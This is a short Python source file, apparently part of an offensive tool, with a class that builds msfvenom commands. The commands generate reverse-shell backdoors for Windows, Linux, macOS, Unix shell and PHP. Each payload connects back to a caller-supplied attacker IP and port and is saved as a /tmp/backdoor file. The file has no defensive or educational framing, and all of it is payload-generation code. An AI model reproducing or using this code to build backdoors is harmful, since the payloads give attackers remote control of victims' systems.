class msfCrafting(object):
    """docstring for msfCrafting."""
    def __init__(self, platform, ipaddrs, remoteport):
        self.venomcmd = ''
        self.plat = platform
        self.ip = ipaddrs
        self.port = remoteport
        self.file = ''

    def createWindowsPayload(self):
        self.venomcmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port} -f exe -o /tmp/backdoor.exe"
        self.file = '/tmp/backdoor.exe'

    def createShPayload(self):
        self.venomcmd = f"msfvenom -p cmd/unix/reverse_bash LHOST={self.ip} LPORT={self.port} -f raw -o /tmp/backdoor.sh"
        self.file = '/tmp/backdoor.sh'

    def createLinuxPayload(self):
        self.venomcmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port} -f elf -o /tmp/backdoor.elf"
        self.file = '/tmp/backdoor.elf'

    def createOsxPayload(self):
        self.venomcmd = f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={self.ip} LPORT={self.port} -f macho -o /tmp/backdoor.macho"
        self.file = '/tmp/backdoor.macho'

    def createPhpPayload(self):
        self.venomcmd=f"msfvenom -p php/reverse_php LHOST={self.ip} LPORT={self.port} -f raw -o /tmp/backdoor.php"
        self.file = '/tmp/backdoor.php'

    def run(self):
        platform_functions = {
            'windows': self.createWindowsPayload,
            'sh': self.createShPayload,
            'linux': self.createLinuxPayload,
            'macox': self.createOsxPayload,
            'web': self.createPhpPayload,
        }
        if self.plat in platform_functions:
            platform_functions[self.plat]()

    def getPayloadFile(self):
        return self.file

    def getPayloadCmd(self):
        return self.venomcmd
